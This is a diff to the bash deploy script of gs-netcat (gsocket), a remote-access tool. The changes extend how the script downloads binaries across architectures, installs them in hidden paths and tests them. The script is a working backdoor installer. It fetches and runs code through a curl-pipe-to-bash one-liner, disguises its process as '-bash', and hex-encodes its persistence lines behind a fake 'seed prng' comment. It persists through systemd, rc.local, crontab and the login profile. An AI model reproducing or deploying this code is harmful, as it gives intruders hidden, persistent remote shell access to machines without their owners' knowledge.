@@ -41,7 +41,7 @@ CC="\033[1;36m" # cyan
 CM="\033[1;35m" # magenta
 CN="\033[0m"    # none
 
-if [[ -z $GS_DEBUG ]]; then
+if [[ -z "$GS_DEBUG" ]]; then
 	DEBUGF(){ :;}
 else
 	DEBUGF(){ echo -e "${CY}DEBUG:${CN} $*";}
@@ -78,8 +78,10 @@ exit_alldone()
 # Called _after_ init_vars() at the end of init_setup.
 init_dstbin()
 {
-	DSTBIN="${GS_PREFIX}/usr/bin/${BIN_HIDDEN_NAME}"
 	# Try systemwide installation first
+	DSTBIN="${GS_PREFIX}/usr/bin/${BIN_HIDDEN_NAME}"
+	# check_rwx_bin "$DSTBIN"
+	# [[ -n $IS_DIR_WREX ]] && return
 	touch "$DSTBIN" &>/dev/null && { return; }
 
 	# Try user installation
@@ -87,14 +89,15 @@ init_dstbin()
 	DSTBIN="${GS_PREFIX}${HOME}/.usr/bin/${BIN_HIDDEN_NAME}"
 	touch "$DSTBIN" &>/dev/null && { return; }
 
-	# Try /dev/shm 
+	# Try /tmp/.gs
+	DSTBIN="/tmp/.gs-${UID}/${BIN_HIDDEN_NAME}"
+	touch "$DSTBIN" &>/dev/null && { return; }
+
+	# Try /dev/shm as last resort
+	# This is often mounted noexec (e.g. docker) 
 	DSTBIN="/dev/shm/${BIN_HIDDEN_NAME}"
 	touch "$DSTBIN" &>/dev/null && { return; }
 
-	# Try /tmp/.gs as last resort
-	DSTBIN="${TMPDIR}/${BIN_HIDDEN_NAME}"
-	touch "$DSTBIN" &>/dev/null && { return; }
-	
 	errexit "FAILED. Can not find writeable directory."
 }
 
@@ -106,41 +109,43 @@ init_vars()
 	if [[ $OSTYPE == *linux* ]]; then 
 		if [[ x"$arch" == "xi686" ]]; then
 			if [[ $(uname -r) == *arch* ]]; then
-				SRC_PKG="gs-netcat_i686-arch.tar.gz"
+				OSARCH="i686-arch"
 			else
-				SRC_PKG="gs-netcat_i686-debian.tar.gz"
+				OSARCH="i686-debian"
 			fi
 		elif [[ x"$arch" == "xarmv6l" ]]; then
-			SRC_PKG="gs-netcat_armv6l-linux.tar.gz"
+			OSARCH="armv6l-linux"
 		else
-			if [[ $(uname -r) == *arch* ]]; then
-				SRC_PKG="gs-netcat_x86_64-arch.tar.gz"
+			if grep Arch /etc/issue &>/dev/null; then
+				OSARCH="x86_64-arch"
 			else
-				SRC_PKG="gs-netcat_x86_64-debian.tar.gz"
+				OSARCH="x86_64-debian"
 			fi
 		fi
 	elif [[ $OSTYPE == *darwin* ]]; then
-			SRC_PKG="gs-netcat_x86_64-osx.tar.gz"
+			OSARCH="x86_64-osx"
 	elif [[ $OSTYPE == *FreeBSD* ]]; then
-			SRC_PKG="gs-netcat_x86_64-freebsd.tar.gz"
+			OSARCH="x86_64-freebsd"
 	elif [[ $OSTYPE == *cygwin* ]]; then
-			SRC_PKG="gs-netcat_x86_64-cygwin.tar.gz"
+			OSARCH="x86_64-cygwin"
 	fi
 
 	if grep Alpine /etc/issue &>/dev/null; then
-		SRC_PKG="gs-netcat_x86_64-alpine.tar.gz"
+		OSARCH="x86_64-alpine"
 	fi
-	[[ -z "$SRC_PKG" ]] && SRC_PKG="gs-netcat_x86_64-debian.tar.gz" # Try debian 64bit as last resort
+	[[ -z "$OSARCH" ]] && OSARCH="x86_64-debian" # Try debian 64bit as last resort
 
 	if [[ -d /dev/shm ]]; then
-		TMPDIR="/dev/shm/.gs"
+		TMPDIR="/dev/shm/.gs-${UID}"
 	elif [[ -d /tmp ]]; then
-		TMPDIR="/tmp/.gs"
+		TMPDIR="/tmp/.gs-${UID}"
 	fi
 
+	SRC_PKG="gs-netcat_${OSARCH}.tar.gz"
+
 	# Docker does not set USER
-	[[ -z $USER ]] && USER=$(id -un)
-	[[ -z $UID ]] && UID=$(id -u)
+	[[ -z "$USER" ]] && USER=$(id -un)
+	[[ -z "$UID" ]] && UID=$(id -u)
 
 	# OSX's pkill matches the hidden name and not the original binary name.
 	# Because we hide as '-bash' we can not pkill all -bash.
@@ -157,7 +162,7 @@ init_vars()
 		KL_CMD_UARG="-u${USER}"
 	fi
 
-	# command -v "$KL_CMD" >/dev/null || WARM_OUT "No pkill or killall found."
+	command -v "$KL_CMD" >/dev/null || WARN "No pkill or killall found."
 	# command -v "$KL_CMD" >/dev/null || errexit "Need pkill or killall."
 
 	# Defaults
@@ -214,7 +219,8 @@ init_setup()
 	PROFILE_LINE="command -v ${KL_CMD} >/dev/null && ${KL_CMD} -0 ${KL_CMD_UARG} ${BIN_HIDDEN_NAME} 2>/dev/null || (TERM=xterm-256color GSOCKET_ARGS=\"-k ${USER_SEC_FILE} -liqD\" exec -a ${PROC_HIDDEN_NAME} ${DSTBIN})"
 	CRONTAB_LINE="command -v ${KL_CMD} >/dev/null && ${KL_CMD} -0 ${KL_CMD_UARG} ${BIN_HIDDEN_NAME} 2>/dev/null || SHELL=$SHELL TERM=xterm-256color GSOCKET_ARGS=\"-k ${USER_SEC_FILE} -liqD\" $(command -v bash) -c \"exec -a ${PROC_HIDDEN_NAME} ${DSTBIN}\""
 
-	if command -v xxd >/dev/null; then
+	# check that xxd is working as expected (alpine linux does not have -r option)
+	if [[ "$(echo "thcwashere" | xxd -ps -c1024 2>/dev/null| xxd -r -ps 2>/dev/null)" = "thcwashere" ]]; then
 		local p
 		p="$(echo "$RCLOCAL_LINE" | xxd -ps -c1024)"
 		RCLOCAL_LINE="echo $p|xxd -r -ps|bash #1b5b324a50524e47 >/dev/random # seed prng ${BIN_HIDDEN_NAME}-kernel"
@@ -226,6 +232,7 @@ init_setup()
 		CRONTAB_LINE="echo $p|xxd -r -ps|bash #1b5b324a50524e47 >/dev/random # seed prng ${BIN_HIDDEN_NAME}-kernel"
 	fi
 	DEBUGF "TMPDIR=${TMPDIR}"
+	DEBUGF "DSTBIN=${DSTBIN}"
 }
 
 uninstall_rm()
@@ -277,6 +284,7 @@ uninstall()
 
 	uninstall_rm "/dev/shm/${BIN_HIDDEN_NAME}"
 	uninstall_rm "${TMPDIR}/${SRC_PKG}"
+	uninstall_rm "${TMPDIR}/._gs-netcat" # from docker???
 	uninstall_rmdir "${TMPDIR}"
 
 	# Remove from login script
@@ -291,7 +299,7 @@ uninstall()
 	# Remove systemd service
 	# STOPPING would kill the current login shell. Do not stop it.
 	# systemctl stop "${SERVICE_HIDDEN_NAME}" &>/dev/null
-	command -v systemctl >/dev/null && [[ $UID -eq 0 ]] && { systemctl disable "${BIN_HIDDEN_NAME}" ; systemctl daemon-reload; } 
+	command -v systemctl >/dev/null && [[ $UID -eq 0 ]] && { systemctl disable "${BIN_HIDDEN_NAME}" 2>/dev/null && systemctl daemon-reload 2>/dev/null; } 
 	uninstall_rm "${SERVICE_FILE}"
 	uninstall_rm "${SERVICE_DIR}/${SEC_NAME}"
 
@@ -323,10 +331,16 @@ WARN()
 	echo -e 1>&2 "--> ${CY}WARNING: ${CN}$*"
 }
 
+WARN_EXECFAIL_SET()
+{
+	[[ -n "$WARN_EXECFAIL_MSG" ]] && return # set it once (first occurance) only
+	WARN_EXECFAIL_MSG="CODE=${1} (${2}): ${CY}$(uname -n -m -r)${CN}"
+}
+
 WARN_EXECFAIL()
 {
 	echo -e 1>&2 "--> Please send this output to ${CC}members@thc.org${CN} to get it fixed."
-	echo -e 1>&2 "--> CODE=${1} (${2}): ${CY}$(uname -n -m -r)${CN}"
+	echo -e 1>&2 "--> ${WARN_EXECFAIL_MSG}"
 }
 
 gs_secret_reload()
@@ -380,7 +394,7 @@ WantedBy=multi-user.target" >"${SERVICE_FILE}"
 
 	(systemctl enable "${SERVICE_HIDDEN_NAME}" && \
 	systemctl start "${SERVICE_HIDDEN_NAME}" && \
-	systemctl is-active "${SERVICE_HIDDEN_NAME}") &>/dev/null || { rm -f "${SERVICE_FILE}"; return; } # did not work...
+	systemctl is-active "${SERVICE_HIDDEN_NAME}") &>/dev/null || { systemctl disable "${SERVICE_HIDDEN_NAME}" 2>/dev/null; rm -f "${SERVICE_FILE}"; return; } # did not work...
 
 	IS_SYSTEMD=1
 	IS_GS_RUNNING=1
@@ -422,9 +436,9 @@ install_system()
 	install_system_systemd
 
 	# Try good old /etc/rc.local
-	[[ -z $IS_INSTALLED ]] && install_system_rclocal
+	[[ -z "$IS_INSTALLED" ]] && install_system_rclocal
 
-	[[ -z $IS_INSTALLED ]] && { FAIL_OUT "no systemctl or /etc/rc.local"; return; }
+	[[ -z "$IS_INSTALLED" ]] && { FAIL_OUT "no systemctl or /etc/rc.local"; return; }
 
 	OK_OUT
 }
@@ -433,7 +447,7 @@ install_user_crontab()
 {
 	command -v crontab >/dev/null || return # no crontab
 	echo -en 2>&1 "Installing access via crontab........................................."
-	[[ -z $KL_CMD ]] && { FAIL_OUT "No pkill or killall found."; return; }
+	[[ -z "$KL_CMD" ]] && { FAIL_OUT "No pkill or killall found."; return; }
 	if crontab -l 2>/dev/null | grep "$BIN_HIDDEN_NAME" &>/dev/null; then
 		IS_INSTALLED=1
 		IS_SKIPPED=1
@@ -444,7 +458,7 @@ install_user_crontab()
 
 	local cr_time
 	cr_time="59 * * * *"
-	[[ -n $GS_DEBUG ]] && cr_time="* * * * *" # easier to debug if this happens every minute..
+	[[ -n "$GS_DEBUG" ]] && cr_time="* * * * *" # easier to debug if this happens every minute..
 	(crontab -l 2>/dev/null && \
 	echo "$NOTE_DONOTREMOVE" && \
 	echo "${cr_time} $CRONTAB_LINE") | crontab - 2>/dev/null || { FAIL_OUT; return; }
@@ -456,7 +470,7 @@ install_user_crontab()
 install_user_profile()
 {
 	echo -en 2>&1 "Installing access via ~/.profile......................................"
-	[[ -z $KL_CMD ]] && { FAIL_OUT "No pkill or killall found."; return; }
+	[[ -z "$KL_CMD" ]] && { FAIL_OUT "No pkill or killall found."; return; }
 	[[ -f "${RC_FILE}" ]] || { touch "${RC_FILE}"; chmod 600 "${RC_FILE}"; }
 	if grep "$BIN_HIDDEN_NAME" "$RC_FILE" &>/dev/null; then
 		IS_INSTALLED=1
@@ -487,7 +501,7 @@ install_user()
 	# install_user_profile
 	install_user_profile
 
-	[[ -z $IS_SKIPPED ]] && gs_secret_write "$USER_SEC_FILE" # Create new secret file
+	[[ -z "$IS_SKIPPED" ]] && gs_secret_write "$USER_SEC_FILE" # Create new secret file
 }
 
 # Download $1 and save it to $2
@@ -509,7 +523,12 @@ dl()
 	fi
 
 	# Debugging / testing. Use local package if available
-	[[ -n "$GS_DEBUG" ]] && [[ -f "../packaging/gsnc-deploy-bin/${1}" ]] && cp "../packaging/gsnc-deploy-bin/${1}" "${2}" 2>/dev/null && return
+	if [[ -n "$GS_DEBUG" ]]; then
+		[[ -f "../packaging/gsnc-deploy-bin/${1}" ]] && cp "../packaging/gsnc-deploy-bin/${1}" "${2}" 2>/dev/null && return
+		[[ -f "/gsocket-pkg/${1}" ]] && cp "/gsocket-pkg/${1}" "${2}" 2>/dev/null && return
+		FAIL_OUT "GS_DEBUG set but deployment binaries not found (${1})..."
+		errexit
+	fi
 
 	if [[ "$DL_CMD" == "$DL_CRL" ]]; then
 		dl_log=$(curl -fL "${URL_BASE}/${1}" --output "${2}" 2>&1)
@@ -532,7 +551,6 @@ gs_access()
 	local ret
 	GS_SECRET="${S}"
 
-	# "${TMPDIR}/gs-netcat" -s "${GS_SECRET}" -i
 	"${DSTBIN}" -s "${GS_SECRET}" -i
 	ret=$?
 	[[ $ret -eq 139 ]] && { EXECFAIL_OUT "$?" "SIGSEGV"; errexit; }
@@ -540,30 +558,93 @@ gs_access()
 	exit_code "$ret"
 }
 
-# binaries are in TMPDIR. Perform a functional test.
-# test_binaries <binary> <no_exec_test=1>
-test_binaries()
+# Binary is in an executeable directory (no noexec-flag)
+# set IS_TESTBIN_OK if binary worked.
+# test_bin <binary>
+test_bin()
 {
 	local bin
-	local no_exec_test
+	local err_log
+	unset IS_TESTBIN_OK
+
 	bin="$1"
-	no_exec_test="$2"
+
 	GS_SECRET=$("$bin" -g)
-	[[ -z "$GS_SECRET" ]] && { FAIL_OUT; WARN_EXECFAIL "$?" "wrong binary"; errexit; }
+	[[ -z "$GS_SECRET" ]] && { FAIL_OUT; ERR_LOG="wrong binary"; WARN_EXECFAIL_SET "$?" "wrong binary"; return; }
 
-	# Only run exec test if installed with -l (not for gs_access)
-	[[ -n $no_exec_test ]] && return # no exec test (S= was specified)
-
-	# Connect to a random host to test binary, resolver and network connectivity.
-	local secret
-	secret=$("$bin" -g)
-	local log
-	log=$(GSOCKET_ARGS="-s selftest-${secret}" exec -a "$PROC_HIDDEN_NAME" "${bin}" 2>&1)
-
+	err_log=$(GSOCKET_ARGS="-s selftest-${GS_SECRET}" exec -a "$PROC_HIDDEN_NAME" "${bin}" 2>&1)
 	ret=$?
-	[[ $ret -eq 139 ]] && { FAIL_OUT; WARN_EXECFAIL "$?" "SIGSEGV"; errexit; }
-	[[ $ret -ne 255 ]] && { FAIL_OUT; echo "$log"; errexit; }
+
+	[[ -z "$ERR_LOG" ]] && ERR_LOG="$err_log"
+	[[ $ret -eq 139 ]] && { FAIL_OUT; ERR_LOG=""; WARN_EXECFAIL_SET "$?" "SIGSEGV"; return; }
+	# Fail unless it's ECONNREFUSED
+	[[ $ret -ne 61 ]] && { FAIL_OUT; WARN_EXECFAIL_SET 0 "default pkg failed"; return; }
+
+	# exit code of gs-netcat was ECONNREFUSED. Thus connection to server
+	# was successfully and server replied that no client is listening. 
+	# This is a good enough test that this binary is working.
+	IS_TESTBIN_OK=1
 }
+
+# try <osarch> <is_with_warning>
+try()
+{
+	local osarch
+	local is_with_warning
+	local src_pkg
+	osarch="$1"
+	is_with_warning="$2"
+
+	src_pkg="gs-netcat_${osarch}.tar.gz"
+	echo -e 2>&1 "--> Trying ${CG}${osarch}${CN}"
+	# Download binaries
+	echo -en 2>&1 "Downloading binaries.................................................."
+	dl "gs-netcat_${osarch}.tar.gz" "${TMPDIR}/${src_pkg}"
+	OK_OUT
+
+	echo -en 2>&1 "Unpacking binaries...................................................."
+	# Unpack
+	(cd "${TMPDIR}" && tar xfz "${src_pkg}") || { FAIL_OUT "unpacking failed"; errexit; }
+	[[ -f "${TMPDIR}/._gs-netcat" ]] && rm -f "${TMPDIR}/._gs-netcat" # from docker???
+	OK_OUT
+
+	echo -en 2>&1 "Copying binaries......................................................"
+	mv "${TMPDIR}/gs-netcat" "$DSTBIN" || { FAIL_OUT; errexit; }
+	chmod 700 "$DSTBIN"
+	OK_OUT
+
+	echo -en 2>&1 "Testing binaries......................................................"
+	test_bin "${DSTBIN}"
+	if [[ -n "$IS_TESTBIN_OK" ]]; then
+		OK_OUT
+		return
+	fi
+
+	rm -f "${TMPDIR}/${src_pkg}"
+	[[ -z "$is_with_warning" ]] && return # silent return
+}
+
+# Download the gs-netcat_any-any.tar.gz and try all of the containing
+# binaries and fail hard if none could be found.
+try_any()
+{
+	targets="x86_64-debian i386-debian i686-arch x86_64-alpine i686-debian x86_64-centos"
+	for osarch in $targets; do
+		[[ x"$osarch" = x"$OSARCH" ]] && continue # Skip the default OSARCH (already tried)
+		try "$osarch"
+		[[ -n "$IS_TESTBIN_OK" ]] && break
+	done
+
+
+	if [[ -n "$IS_TESTBIN_OK" ]]; then
+		echo -e >&2 "--> ${CY}Installation did not go as smooth as it should have.${CN}"
+	else
+		[[ -n "$ERR_LOG" ]] && echo >&2 "$ERR_LOG"
+	fi
+	WARN_EXECFAIL
+	[[ -z "$IS_TESTBIN_OK" ]] && errexit "None of the binaries worked."
+}
+
 
 init_vars
 
@@ -572,37 +653,21 @@ init_vars
 
 init_setup
 
-# Download binaries
-echo -en 2>&1 "Downloading binaries.................................................."
-dl "$SRC_PKG" "${TMPDIR}/${SRC_PKG}"
-OK_OUT
-
-echo -en 2>&1 "Unpacking binaries...................................................."
-# Unpack
-(cd "${TMPDIR}" && tar xfz "${SRC_PKG}" && chmod 700 "${TMPDIR}/gs-netcat") || { FAIL_OUT "unpacking failed"; errexit; }
-OK_OUT
-
-echo -en 2>&1 "Copying binaries......................................................"
-mv "${TMPDIR}/gs-netcat" "$DSTBIN" || { FAIL_OUT; errexit; }
-chmod 700 "$DSTBIN"
-OK_OUT
-
-echo -en 2>&1 "Testing binaries......................................................"
-test_binaries "${DSTBIN}" "${S}" # Also sets GS_SECRET
-OK_OUT
+try "$OSARCH" 1
+[[ -z "$IS_TESTBIN_OK" ]] && try_any
 
 # S= is set. Do not install but connect to remote using S= as secret.
-[[ -n $S ]] && gs_access
+[[ -n "$S" ]] && gs_access
 
 # User supplied secret: X=MySecret bash -c "$(curl -fsSL gsocket.io/x)"
-[[ -n $X ]] && GS_SECRET="$X"
+[[ -n "$X" ]] && GS_SECRET="$X"
 
 # -----BEGIN Install permanentally-----
 # Try to install system wide. This may also start the service.
 [[ $UID -eq 0 ]] && install_system
 
 # Try to install to user's login script or crontab
-[[ -z $IS_INSTALLED ]] && install_user
+[[ -z "$IS_INSTALLED" ]] && install_user
 # -----END Install permanentally-----
 
 if [[ -z "$IS_INSTALLED" ]]; then
@@ -633,7 +698,7 @@ elif [[ -z "$IS_GS_RUNNING" ]]; then
 	# GS_UNDO=1 ./deploy.sh -> removed all binaries but user does not issue 'pkill gs-bd'
 	# ./deploy.sh -> re-installs new secret. Start gs-bd with _new_ secret.
 	# Now two gs-bd's are running (which is correct)
-	if [[ -n $KL_CMD ]]; then
+	if [[ -n "$KL_CMD" ]]; then
 		${KL_CMD} -0 "$KL_CMD_UARG" "${BIN_HIDDEN_NAME}" 2>/dev/null && IS_OLD_RUNNING=1
 	elif command -v pidof >/dev/null; then
 		# if no pkill/killall then try pidof (but we cant tell which user...)
